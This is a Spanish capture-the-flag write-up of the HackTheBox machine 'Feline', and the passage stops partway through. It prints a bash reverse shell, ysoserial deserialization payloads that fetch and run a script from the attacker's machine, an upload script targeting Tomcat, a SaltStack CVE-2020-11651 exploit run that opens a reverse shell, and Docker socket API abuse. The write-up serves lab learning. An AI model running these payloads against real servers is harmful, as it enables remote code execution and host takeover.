---
layout      : post
title       : "HackTheBox - Feline"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274banner.png
categories  : [ htb ]
tags        : [ deserialization, docker, demon ]
---
Máquina Linux nivel difícil. Beleza irmão! De cabezota nos encontraremos con serialización de objetos, enumeraremos y enumeraremos. Jugamos con los servicios que está corriendo **Docker** localmente y explotamos SaltStack. Pivotearemos entre containers rompiendo el demonio Docker.sock

![274felineHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274felineHTB.png)

### TL;DR (Spanish writeup)

**Creadores**: [MinatoTW](https://www.hackthebox.eu/profile/8308) & [MrR3boot](https://www.hackthebox.eu/profile/13531).

Holas, ¿cómo están?

Bueno, empezaremos jugando con `deserialización/serialización` de objetos `.JSP`, directamente obtendremos una Shell como el usuario `tomcat` en el sistema... 

Enumerando los procesos activos encontraremos sobre el puerto `4506` del `localhost` el servicio `SaltStack`. Estará corriendo en un contenedor de `Docker`. Jugaremos con `Remote Port Forwarding`, después usaremos un exploit que nos permite ejecutar una reverse Shell para posicionarnos en la raíz del contenedor como el usuario `root`.

Curiosamente el archivo `.bash_history` va a tener contenido, lo que nos permita percatarnos del demonio que tiene dentro el sistema (sonó chévere :P), `docker.sock`. Usaremos los privilegios que tiene el `daemon` para obtener una Shell en un contenedor que crearemos, pero que al mismo tiempo nos creara una montura de toda la raíz del sistema.

#### Clasificación de la máquina.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Va pa la realidad, cero juegos eh!

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Como siempre empezamos realizando un escaneo de puertos sobre la maquina para saber que servicios esta corriendo.

```bash
–» nmap -p- --open -v 10.10.10.205 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Wed Dec 16 25:25:25 2020 as: nmap -p- --open -v -oG initScan 10.10.10.205
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.205 ()   Status: Up
Host: 10.10.10.205 ()   Ports: 22/open/tcp//ssh///, 8080/open/tcp//http-proxy///
# Nmap done at Wed Dec 16 25:25:25 2020 -- 1 IP address (1 host up) scanned in 161.07 seconds
```

Muy bien, ¿que tenemos?

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Conexion remota segura mediante una shell |
| 8080   | **[HTTP Proxy](https://www.xataka.com/basics/que-es-un-proxy-y-como-puedes-utilizarlo-para-navegar-de-forma-mas-anonima)**: Intermediario en las peticiones de recursos que realiza un cliente a un servidor |

Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:

```bash
–» nmap -p 22,8080 -sC -sV 10.10.10.205 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan 
# Nmap 7.80 scan initiated Wed Dec 16 25:25:25 2020 as: nmap -p 22,8080 -sC -sV -oN portScan 10.10.10.205
Nmap scan report for 10.10.10.205
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.27
|_http-title: VirusBucket
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 16 25:25:25 2020 -- 1 IP address (1 host up) scanned in 19.65 seconds
```

Tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4 |
| 8080   | HTTP     | Apache Tomcat 9.0.27   |

...

### Puerto 8080 [⌖](#puerto-8080) {#puerto-8080}

![274page8080](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274page8080.png)

El único recurso funcional es este:

![274page8080_service](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274page8080_service.png)

Lo cual nos permite subir un archivo, por medio de `JSP` (JavaServer Pages, es similar a **PHP**, pero es usado por **Java**). Si interceptamos por medio de `BurpSuite` la petición, vemos su estructura:

![274burp8080_service](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274burp8080_service.png)

Podemos modificar el contenido del archivo que subamos. Si subimos una imagen nos muestra este error:

![274burp8080_service_upimage](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274burp8080_service_upimage.png)

Vemos una ruta, posiblemente donde se estén guardando los archivos después de ser subidos... Probando webshells, reverseshell, simples `hello`, etc. Y jugando con esa ruta no podía conseguir nada. Volviendo atrás para ver que tenía encontre una vulnerabilidad que me llamo la atención hacia `Apache tomcat 9.0.27`:

* [Remote Code Execution in Apache Tomcat - Deserialization Untrusted Data](https://www.cybersecurity-help.cz/vdb/SB2020052124).
* [Apache Tomcat RCE by deserialization (CVE-2020-9484)](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/).

Básicamente la serialización de un objeto se basa en codificar el mismo para transmitirlo a través de una red, viajará como una serie de **bytes** o en un formato legible para el receptor. La serie de bytes o el formato pueden ser usados para crear un nuevo objeto que es idéntico en todo al original. Esto en resumidas palabras basado en la [Wikipedia](https://es.wikipedia.org/wiki/Serializaci%C3%B3n).

* [Más info sobre serialización y deserializacion (PDF)](https://www.scielo.sa.cr/pdf/tem/v29n1/0379-3982-tem-29-01-00118.pdf).
* [Aprende que es deserialización](https://hackingprofessional.github.io/Security/Aprende-que-es-Deserializacion-Insegura-OWASP-VII/).

Indagando ya en que debemos tener para poder explotar esta vulnerabilidad, tenemos:

1. El atacante (nosotros) debe tener capacidad de subir un archivo con contenido arbitrario. Y conocer donde está siendo almacenado (probablemente lo sepamos).
2. Se debe tener habilitado el `PersistentManager` y que esté usando `FileStore`... (Ya hablaremos un poco de ello abajo).
3. Que existan "gadgets" en el `classpath` que puedan ser usados para deserializar objetos.

Bueno pues el primero lo cumplimos, el segundo y el tercero deberíamos probarlo. Y ver si en algún momento vemos algo. Hablemos de `PersistentManager`:

Funciona como gestor de sesiones, sabiendo que estas sirven para mantener el estado entre peticiones de usuarios. Por default la configuración cuenta con `StandardManager`, pero depende del admin cambiarlo a `PersistentManager`. `StandardManager` permite que las sesiones de usuario se guarden en la memoria, después de que **tomcat** sea cerrado pasara las sesiones al disco en un objeto serializado...

`PersistentManager` hace lo mismo, pero si una sesión ha estado suficiente tiempo inactiva la pasara al disco, esto para reducir el uso de memoria.

Uno puede elegir como y donde quiere que las sesiones sean almacenadas:

* `FileStore`: Se especifica una carpeta en el disco, ahí se guardaran las sesiones dependiendo su ID.
* `JDBCStore`: Se especifica una tabla en la base de datos, donde cada sesión se guarda por fila.

La mayoría de la info la pueden encontrar acá:

* [Apache Tomcat Deserialization - Redtimmy.com](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/).
* [PersistentManager - apache.org](https://tomcat.apache.org/tomcat-5.5-doc/catalina/docs/api/org/apache/catalina/session/PersistentManager.html).
* [Apache Tomcat Deserialization Untrusted Data - Medium.com/@romnenko](https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4). **OJO**

...

## Explotación [#](#explotacion) {#explotacion}

Perfecto, pues enumerando aún más encontré un PoC donde explica como subir varios objetos serializados para finalmente conseguir una reverse Shell:

* [Apache Tomcat Deserialization Untrusted Data - Medium.com/@romnenko](https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4).

Los pasos que debemos seguir son sencillos y fáciles de entender:

1. Crear archivo `bash` donde tengamos la petición hacia nuestra máquina. (Para cuando se ejecute obtener la reverse Shell)
2. Crear objetos serializados: Uno para subir el payload, otro para darle permisos y otro para ejecutarlo.
3. Ponernos en escucha :P
4. Ejecutar las peticiones.

Démosle:

```bash
–» cat ejeje.sh 
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.152/4433 0>&1"
```

Ahora creamos los objetos serializados, usaremos la misma herramienta que él, [**ysoserial**](https://github.com/frohoff/ysoserial#installation).

```bash
#Lo subimos a la maquina y lo guardamos en la ruta /tmp/ejeje.sh
–» java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'curl http://10.10.14.152:8000/ejeje.sh -o /tmp/ejeje.sh' > downloadPayload.session
#Le damos permisos totales
–» java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'chmod 777 /tmp/ejeje.sh' > chmodPayload.session
#Ejecutamos
–» java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash /tmp/ejeje.sh' > executePayload.session
```

```bash
–» ls
chmodPayload.session  downloadPayload.session  ejeje.sh  executePayload.session  ysoserial-master-6eca5bc740-1.jar
```

El creador del post crea un script para hacer las peticiones, vamos a copiarnos pero cambiando algunas cositas:

```bash
–» cat todotaskbro.sh 
#!/bin/bash

email="hola@hola.com"
route_upload="../../opt/tomcat/temp
#route_upload="../../../opt/samples/uploads"

echo -e "\n\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ download +++++++++++++++++++++++++++++++++\n\n"

curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/downloadPayload" -F 'image=@downloadPayload.session'
curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/downloadPayload"
sleep 1

echo -e "\n\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ chmod +++++++++++++++++++++++++++++++++\n\n"

curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/chmodPayload" -F 'image=@chmodPayload.session'
curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/chmodPayload"
sleep 1

echo -e "\n\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ execute ++++++++++++++++++++++++++++++++++\n\n"

curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/executePayload" -F 'image=@executePayload.session'
curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/executePayload"
```

El creador del post crea un script para hacer las peticiones, vamos a copiarnos pero cambiando algunas cositas:
La forma de la petición coincide en varios ítems, solo modificaremos el header y la URL.

Él tiene como ruta donde se están guardando las muestras a `/opt/samples/uploads/`. Nosotros obtuvimos una posible ruta cuando intentamos subir una imagen, podemos probar con esa y ver que obtenemos.

Levantemos un servidor web rápidamente con `Python`, pongámonos en escucha por medio de `netcat` y ejecutemos `todotaskbro.sh`:

```bash
–» python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
–» nc -nlvp 4433
listening on [any] 4433 ...
```

Ahora si ejecutemos:

![274bash_todo_failroute](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274bash_todo_failroute.png)

Pues nos indica que se ha subido el archivo (pero no obtenemos peticiones en nuestro servidor de Python) pero cuando lo intenta ejecutar nos dice `Invalid Request`... Probemos con la ruta que tenía el script original:

```bash
...
route_upload="../../../opt/samples/uploads"
...
```

![274bash_todo_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274bash_todo_done.png)

Perfectooooooooooo, obtenemos nuestra Shell como el usuario `tomcat`... Pero ¿cómo? Si claramente estamos viendo que la página nos respondió con errores. Bueno lo explica claramente el [artículo donde encontramos inicialmente la vulnerabilidad](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/). 

Al momento de realizar la deserializacion de los objetos todo va correcto y ejecuta nuestro código malicioso, el error se muestra cuando intenta interpretar los objetos como **sesiones**, que claramente no lo son. Pero pues en este punto como ya vimos, nuestro código ya se había ejecutado (:

Lindo lindo, con este usuario tenemos acceso a la flag del `user.txt`.

Haciendo un tratamiento de la TTY podemos obtener una Shell completamente interactiva, que nos permita autocompletar, evitar dar por error `CTRL + C` y quedarnos sin Shell y demás beneficios.

* [S4vitar nos guia rapidamente (real, rapidamente)](https://www.youtube.com/watch?v=GVjNI-cPG6M&t=1689).

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando y enumerando encontré algunas cosas interesantes; `puertos locochones` corriendo localmente:

```bash
tomcat@VirusBucket:~$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:4505          0.0.0.0:*               LISTEN
tcp        0      0 localhost:4506          0.0.0.0:*               LISTEN
...
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN
...
```

Tenemos `docker` corriendo en la maquina:

```bash
tomcat@VirusBucket:~$ ifconfig
...
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:73ff:fe0d:a026  prefixlen 64  scopeid 0x20<link>
        ether 02:42:73:0d:a0:26  txqueuelen 0  (Ethernet)
        RX packets 1982  bytes 324390 (324.3 KB) 
        RX errors 0  dropped 0  overruns 0  frame 0               
        TX packets 2320  bytes 257398 (257.3 KB) 
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
...
```

Revisemos el estado del servicio con `systemctl`:

```bash
tomcat@VirusBucket:~$ systemctl status docker
● docker.service - Docker Application Container Engine
     Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
     Active: active (running) since Sat 2020-12-19 18:13:52 UTC; 8h ago
TriggeredBy: ● docker.socket
       Docs: https://docs.docker.com
   Main PID: 930
      Tasks: 32
     Memory: 122.8M
     CGroup: /system.slice/docker.service
             ├─ 930 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
             ├─1288 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8000 -container-ip 172.17.0.2 -container-port 8000
             ├─1303 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4506 -container-ip 172.17.0.2 -container-port 4506
             └─1320 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4505 -container-ip 172.17.0.2 -container-port 4505

Warning: some journal files were not opened due to insufficient permissions.
```

Vemos los 3 puertos que encontramos antes, cada uno es un contenedor corriendo localmente... Acá no creí en lo que había encontrado inicialmente y me puse a sobre pensar las cosas, lo que me llevo a perder tiempo y ganarme un lindo `RabbitHole`, pero bueno, de eso se aprende:

Al principio que vi los puertos `4505` y `4506` me fui de una para la web a buscar que significado tenían esos puertos, pues los dos son manejados por el servicio `SaltStack`, que funciona como automatizado de eventos y tareas remotas, además de gestionar configuraciones, creado con `Python`.

* [Info del puerto `4505`](https://www.speedguide.net/port.php?port=4505).
* [Info del puerto `4506`](https://www.speedguide.net/port.php?port=4506).

Pues al ver eso no le preste atención y mientras que investigaba ya tenía en mi cabeza hacer `Remote Port Forwarding` y ver si encontrábamos algo diferente mediante la web o con `nmap`: Pues tome cada puerto e hice el forwarding, enumere cada servicio en la web, intente `netcat`, `telnet`, escanee con `nmap` (que creo que si me sirvió de algo) yyyy queme tiempo pensando que podría ser o que no estaba viendo...

El `Remote Port Forwarding` lo realicé con `SSH`, en el caso del puerto `8000` sería así:

```bash
tomcat@VirusBucket:~$ ssh -R 8000:127.0.0.1:8000 root@10.10.14.152 -p 177
```

* Le indicamos que queremos que sea **Remote** (`-R`).
* Tome el puerto `8000` que está sobre el localhost y lo monte en el puerto `8000` de mí máquina.
* Mi `SSH` lo tengo sobre el puerto `177`.

El escaneo de `nmap` indicaba:

| Puerto | Descripción |
| ------ | :---------- |
| 8000   | CherryPy wsgiserver 18.6.0 |
| 4505   | ZeroMQ ZMTP 2.0            |
| 4506   | ZeroMQ ZMTP 2.0            |

Busque vulnerabilidades sobre cada uno de ellos, pero no funcionaban o sencillamente no había.

Después del tiempo quemado, volvía tras e hice el `netstat -l` de nuevo. Tome los puertos `4505` y `4506` y busque exploits hacia `SaltStack`, [pues encontré 2 que se aprovechan](https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652) de un modelo llamado `master-slave`, donde `master` es llamado `salt master` y `slave` se llama `salt minions`, entonces `salt master` es usado para enviar comandos y tareas (configuraciones) a los `salt minions`. En la vulnerabilidad, la función `ClearFuncs` no válida propiamente los metodos de llamado, ahi obtenemos una brecha que podemos aprovechar:

* [Articulo de TrendMicro explicando las vulnerabilidades](https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652).

Una de las vulnerabilidades (CVE-2020-11652) nos permite ver archivos del sistema mediante un `Directory Path Traversal`. El otro (CVE-2020-11651) nos permite ejecución remota de comandos mediante un bypass auth. Inclinémonos por el segundo.

> These can be exploited by remote, unauthenticated attackers, and all versions of SaltStack Salt before 2019.2.4 and 3000 before 3000.2 are affected. [TrendMicro](https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652)

En github tenemos dos PoC's:

* [CVE-2020-11651 - Github/jasperla](https://github.com/jasperla/CVE-2020-11651-poc).
* [CVE-2020-11651 - Github/dozernz](https://github.com/dozernz/cve-2020-11651).

Entonces lo primero que debemos hacer es hacer un `Remote Port Forwarding` de los dos puertos para ver cuál de los dos es vulnerable (o ninguno) :P (Pero pues sí, hay uno vulnerable porque o si no no hubiera escrito esto :P:P)

En nuestra máquina validamos que tenemos sobre ese puerto:

```bash
–» lsof -i:4505
✗ ••• bAd •••· ~/sec/htb/feline/exploit
–» 
```

Hacemos el forwarding:

```bash
tomcat@VirusBucket:~$ ssh -R 4505:127.0.0.1:4505 root@10.10.14.152 -p 177
```

Y volvemos a validar a ver si ya tenemos el servicio en nuestra maquina:

```bash
–» lsof -i:4505
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd    164674 root    9u  IPv6 839839      0t0  TCP localhost:4505 (LISTEN)
sshd    164674 root   10u  IPv4 839840      0t0  TCP localhost:4505 (LISTEN)
```

La ejecución de los exploits también me llevo un poco entenderlo y básicamente fue por no leer. En el GitHub de cada uno tienen: `There's no interactivity implemented, youll need to catch a reverse shell`. Asi que si o si debemos obtener una shell :P

Pongámonos en escucha por el puerto `4434` de una :P

```bash
–» nc -nlvp 4434
listening on [any] 4434 ...
```

Entonces, empecemos con el de [`jasperla`](https://github.com/jasperla/CVE-2020-11651-poc) a ver si obtenemos éxito con este, su ejecución es sencilla e intuitiva, además en el código viene el puerto `4506` por defecto, pero pues probemos que pasa con el `4505`.

```py
def main():
    parser = argparse.ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652')
    parser.add_argument('--master', '-m', dest='master_ip', default='127.0.0.1')
    parser.add_argument('--port', '-p', dest='master_port', default='4506')
    parser.add_argument('--force', '-f', dest='force', default=False, action='store_false')
    parser.add_argument('--debug', '-d', dest='debug', default=False, action='store_true')
    parser.add_argument('--run-checks', '-c', dest='run_checks', default=False, action='store_true')
    parser.add_argument('--read', '-r', dest='read_file')
    parser.add_argument('--upload-src', dest='upload_src')
    parser.add_argument('--upload-dest', dest='upload_dest')
    parser.add_argument('--exec', dest='exec', help='Run a command on the master')
    parser.add_argument('--exec-all', dest='exec_all', help='Run a command on all minions')
    args = parser.parse_args()
```

```bash
–» python3 exploit.py --port 4505 --exec 'bash -c "bash -i >& /dev/tcp/10.10.14.218/4434 0>&1"'
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (127.0.0.1:4505) status... OFFLINE
```

Él offline quiere decir que intento hacer ping y no consiguió respuesta, así que hagamos el forwarding pero con el puerto `4506`, y ejecutemos:

![274bash_containerbash](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274bash_containerbash.png)

(Ni con `nc ip port -e /bin/bash` ni con la versión antigua de `nc` obtuve ninguna respuesta)

Lindo lindo, obtenemos una shell sobre el contenedor del puerto `4506`, hacemos tratamiento de la TTY yyyy vemos cositas interesantes:

* Tenemos un archivo `todo.txt`.
* Curioso que el archivo `.bash_history` tiene contenido.

```bash
root@2d24bf61767c:~# cat todo.txt 
- Add saltstack support to auto-spawn sandbox dockers through events.
- Integrate changes to tomcat and make the service open to public.
```

```bash
root@2d24bf61767c:~# cat .bash_history
paswd
passwd
passwd
passswd
passwd
passwd
cd /root
ls
ls -la
rm .wget-hsts
cd .ssh/
ls
cd ..
printf '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cat todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cd /home/tomcat
cat /etc/passwd
exit
cd /root/
ls
cat todo.txt 
ls -la /var/run/
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
exit
```

Vemos en la última línea algo curioso, `/var/run/docker.sock`. Antes de cualquier cosa, entendamos que hace ese archivo:

> Communicate with the Docker daemon from within a container. [Medium.com/better-programming](https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd)

Como se explica en el post anterior, se basa en un demonio, el cual queda escuchando mediante el archivo `docker.sock`, principalmente es el punto de entrada para usar `Docker API`, lo que nos permite comunicarnos hacia el `host (contenedor)` principal. Mediante él podemos crear contenedores, inspeccionarlos, borrarlos, enviar peticiones y también enviar comandos (:

Más info:

* [About /var/run/docker.sock - Medium/better-programming](https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd).
* [Can anyone explain docker.sock - Stackoverflow](https://stackoverflow.com/questions/35110146/can-anyone-explain-docker-sock/35110344).
* [Daemon socket option - Docs.docker](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option).

> By default, a unix domain socket (or IPC socket) is created at /var/run/docker.sock, requiring either `root` permission, or `docker group` membership.

Lo que quiere decir que estamos ejecutando peticiones como usuario administrador del contenedor.

...

Con esto en mente y entendiendo que hace, pues retomemos lo que encontramos en el archivo `.bash_history`:

```bash
root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

```json
[
   {
      "Containers":-1,
      "Created":1590787186,
      "Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e",
      "Labels":null,
      "ParentId":"",
      "RepoDigests":null,
      "RepoTags":[
         "sandbox:latest"
      ],
      "SharedSize":-1,
      "Size":5574537,
      "VirtualSize":5574537
   },
   {
      "Containers":-1,
      "Created":1588544489,
      "Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9",
      "Labels":null,
      "ParentId":"",
      "RepoDigests":[
         "<none>@<none>"
      ],
      "RepoTags":[
         "<none>:<none>"
      ],
      "SharedSize":-1,
      "Size":1056679100,
      "VirtualSize":1056679100
   }
]
```

Tenemos únicamente la imagen de `sandbox`, veamos que contenedores hay:

> Las imagenes Docker son plantillas (que incluyen una aplicación, los binarios y las librerias necesarias) que se utilizan para construir contenedores `Docker`. [ElTallerdelBit](https://eltallerdelbit.com/imagenes-docker/)

```bash
root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

```json
[
   {
      "Id":"2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2",
      "Names":[
         "/saltstack"
      ],
      "Image":"188a2704d8b0",
      "ImageID":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9",
      "Command":"/usr/bin/dumb-init /usr/local/bin/saltinit",
      "Created":1593520419,
      "Ports":[
         {
            "PrivatePort":22,
            "Type":"tcp"
         },
         {
            "IP":"127.0.0.1",
            "PrivatePort":4505,
            "PublicPort":4505,
            "Type":"tcp"
         },
         {
            "IP":"127.0.0.1",
            "PrivatePort":4506,
            "PublicPort":4506,
            "Type":"tcp"
         },
         {
            "IP":"127.0.0.1",
            "PrivatePort":8000,
            "PublicPort":8000,
            "Type":"tcp"
         }
      ],
      "Labels":{
         
      },
      "State":"running",
      "Status":"Up 18 hours",
      "HostConfig":{
         "NetworkMode":"default"
      },
      "NetworkSettings":{
         "Networks":{
            "bridge":{
               "IPAMConfig":null,
               "Links":null,
               "Aliases":null,
               "NetworkID":"b4f085309fd324b75ee7b6982cb132fe7c9161732a000160fc79c8c5250492b0",
               "EndpointID":"c457d7e08e1a5cfa6d124bd5a9fdff00b15edf121558d1a96ed12bfa0720a3e3",
               "Gateway":"172.17.0.1",
               "IPAddress":"172.17.0.2",
               "IPPrefixLen":16,
               "IPv6Gateway":"",
               "GlobalIPv6Address":"",
               "GlobalIPv6PrefixLen":0,
               "MacAddress":"02:42:ac:11:00:02",
               "DriverOpts":null
            }
         }
      },
      "Mounts":[
         {
            "Type":"bind",
            "Source":"/var/run/docker.sock",
            "Destination":"/var/run/docker.sock",
            "Mode":"",
            "RW":true,
            "Propagation":"rprivate"
         }
      ]
   }
]
```

Listones, podemos extraer el nombre y el ID del contenedor, pero nada más, pues busquemos en internet como podemos aprovecharnos del demonio :)

> Exposing /var/run/docker.sock could lead to full environment takeover. [Dejandayoff.com](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)

Encontramos varias maneras con las cuales podemos romperlo. Podemos usar la opción `exec`, que simplemente cuando sea llamada será ejecutada sobre el contenedor. Acá podemos indicarle el comando que queremos ejecutar:

* [Riesgos al tener el demonio `/var/run/docker.sock` accesible - Stackoverflow.com](https://stackoverflow.com/questions/40844197/what-is-the-docker-security-risk-of-var-run-docker-sock).
* [Peligros de exponer el demonio `docker.sock` - Dejandayoff.com](https://dejandayoff.com/the-danger-of-exposing-docker.sock/).

```bash
root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost/containers/2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2/exec
HTTP/1.1 201 Created
Api-Version: 1.40
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/19.03.8 (linux)
Date: Tue, 22 Dec 2020 23:28:09 GMT
Content-Length: 74

{"Id":"eff6b5d22c4b640f022d8f98b253a314b0a7cda0669ca1581d6916060d8dabdc"}
```

Con lo anterior creamos un ID para esa tarea `exec` que queremos ejecutar, así que ahora le indicamos que nos lo ejecute:

```bash
root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost/exec/eff6b5d22c4b640f022d8f98b253a314b0a7cda0669ca1581d6916060d8dabdc/start
HTTP/1.1 200 OK
Content-Type: application/vnd.docker.raw-stream
Api-Version: 1.40
Docker-Experimental: false
Ostype: linux
Server: Docker/19.03.8 (linux)

root@2d24bf61767c:~# 
```

Pero no pasa nada :P

Después de probar varias cositas, lo único que me dio respuesta fue hacer una petición hacia mí máquina mediante `wget` o `curl`, pero no pude hacer nada con eso... Así que seguí buscando.

Algunos buenos post que intente y que explican muy bien:

* [A tale of escaping a hardened docker container - RedTimmy.com](https://www.redtimmy.com/a-tale-of-escaping-a-hardened-docker-container/).
* [Understanding security risks of running docker containers - Ctl.io](https://www.ctl.io/developers/blog/post/tutorial-understanding-the-security-risks-of-running-docker-containers).
* [Abusing Docker API - SecurityBoulevard.com](https://securityboulevard.com/2019/02/abusing-docker-api-socket/).

Este último tiene varios links también de apoyo con lindas referencias, miraremos una de ellas:

